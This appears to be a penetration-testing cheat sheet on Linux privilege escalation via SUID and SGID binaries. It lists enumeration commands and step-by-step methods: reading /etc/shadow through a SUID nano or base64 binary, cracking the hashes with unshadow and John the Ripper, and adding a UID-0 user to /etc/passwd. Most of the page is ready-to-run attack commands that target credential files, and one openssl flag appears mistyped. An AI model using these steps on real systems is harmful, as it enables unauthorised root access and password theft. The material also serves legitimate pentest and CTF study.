# SUID & SGID Executables
**SUID:** Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.

Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration

**GUID** permission is similar to the SUID permission, only difference is – when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member

## 📌Enumeration:
```
find / -uid 0 -perm -4000 -type f 2>/dev/null 			# → Finds SUID files owned by root (UID 0), useful for privilege escalation.
find / -perm -u=s -type f 2>/dev/null | xargs ls -l		# → Finds files with SUID (Set User ID) permission and lists them in long format.
find / -perm -g=s -type f 2>/dev/null | xargs ls -l		# → Finds files with SGID (Set Group ID) permission and lists them in long format.
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;	# → Another way to find SUID files and list them in long format.
find / -group [user] 2>/dev/null				# → Finds files belonging to a specific group, replace [user] with the group name.
find / -user <xxx>						# → Finds files owned by user <xxx>, replace <xxx> with actual username.

find / -user <username> -type f 2>&1 | grep -v “Permission” | grep -v “No such”		# → Finds files owned by a specific user, filters out permission denied and missing file errors.
find / \( -perm -u+s -or -perm -g+s  \) -type f -exec ls -l {} \; 2>/dev/null		# → Finds both SUID and SGID files and lists them with ls -l.
```

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

## 📌Privilege Escalation using Nano Editor SUID Binary
The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.

### Method-1️⃣: Reading the /etc/shadow file
**nano /etc/shadow** will print the contents of the **/etc/shadow** file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the **/etc/shadow** and **/etc/passwd** files.

**Step-1:** Copy and Save both /etc/passwd and /etc/shadow file content in attacking machine.

**Step-2:** Use the unshadow tool to create a file crackable by John the Ripper. 
```
unshadow passwd.txt shadow.txt > passwords.txt
```
**Step-3:** Use John the Ripper to crack the password
```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

### Method-2️⃣: Add a new user that has root privileges.
**Step-1:** Generate the hash value of the password.
```
openssl passwd -l -salt <username> <password>		# → <username> your new user or currect username and <password> is newpassword.
```

**Step-2:** Open /etc/passwd using nano and chnage or add the new user password hash and shell.
```
root2:<hash>:0:0:root:/root:/bin/bash	# Change the <hash> with the generated hash value.
```
**Step-3:** Switch to the user using the newpassword
```
su <username>
id && whoami
```

## 📌Privilege Escalation using base64 SUID Binary
```
find / -type f -perm -04000 -ls 2>/dev/null
```
Using this command if we see the /usr/bin/base64 is SUID bit set then try to doing some steps to get root privilege.

**Step-1:** Reading the /etc/shadow file and save the content in attacking machine
```
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```
**Step-2:** Reading the /etc/passwd file and save the content in attacking machine.
```
cat /etc/passwd
```
**Step-3:** Use the unshadow tool to create a file crackable by John the Ripper. 
```
unshadow passwd.txt shadow.txt > passwords.txt
```
**Step-4:** Use John the Ripper to crack the password
```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

# 🔎Other Techniques
You can use this article to see other techniques:👉 [https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/]
